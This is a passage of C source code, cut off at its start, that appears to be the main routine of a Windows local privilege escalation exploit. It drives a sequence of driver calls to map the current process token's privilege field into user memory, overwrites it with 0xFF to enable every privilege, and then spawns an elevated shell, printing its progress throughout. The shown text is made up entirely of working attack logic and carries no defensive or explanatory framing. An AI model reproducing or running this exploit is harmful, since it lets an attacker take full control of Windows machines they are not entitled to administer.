f (!tokenAddress)
    {
        printf("[-] Failed to get token address\n");
        goto cleanup;
    }

    privAddr = tokenAddress + OFFSET_OF_TOKEN_PRIVILEGES;

    printf("[+] Token address: 0x%llx\n", tokenAddress);
    printf("[+] Privileges address: 0x%llx\n", privAddr);
    printf("\n");

    printf("[*] Executing exploit...\n");

    if (!FSInitializeContextRendezvous(DeviceH1))
    {
        printf("[-] FSInitializeContextRendezvous failed\n");
        goto cleanup;
    }
    printf("[+] FSInitializeContextRendezvous succeeded\n");

    if (!FSInitializeStream(DeviceH2))
    {
        printf("[-] FSInitializeStream failed\n");
        goto cleanup;
    }
    printf("[+] FSInitializeStream succeeded\n");

    if (!FSRegisterStream(DeviceH3))
    {
        printf("[-] FSRegisterStream failed\n");
        goto cleanup;
    }
    printf("[+] FSRegisterStream succeeded\n");

    if (!PublishTx(DeviceH3, privAddr))
    {
        printf("[-] PublishTx failed\n");
        goto cleanup;
    }
    printf("[+] PublishTx succeeded\n");

    if (!ConsumeTx(DeviceH3, &mappedAddress))
    {
        printf("[-] ConsumeTx failed\n");
        goto cleanup;
    }
    printf("[+] ConsumeTx succeeded\n");
    printf("\n");

    if (mappedAddress != NULL)
    {
        uint64_t address = (uint64_t)mappedAddress;
        uint64_t baseAlignment = 0x1000;
        uint64_t alignedAddress = address & ~(baseAlignment - 1);

        printf("[+] Mapped address: %p\n", mappedAddress);
        printf("[+] Aligned address: 0x%llx\n", alignedAddress);
        printf("\n");

        printf("[*] Enabling all token privileges...\n");
        memset(mappedAddress, 0xFF, 0x10);
        printf("[+] All privileges enabled!\n");
        printf("\n");

        if (spawnShell())
        {
            printf("\n[+] Exploit completed successfully!\n");
        }
        else
        {
            printf("\n[-] Failed to spawn elevated shell\n");
        }
    }
    else
    {
        printf("[-] Failed to map address\n");
    }

cleanup:
    if (DeviceH1) CloseHandle(DeviceH1);
    if (DeviceH2) CloseHandle(DeviceH2);
    if (DeviceH3) CloseHandle(DeviceH3);

    printf("\n[*] Cleanup completed\n");
    return 0;
}

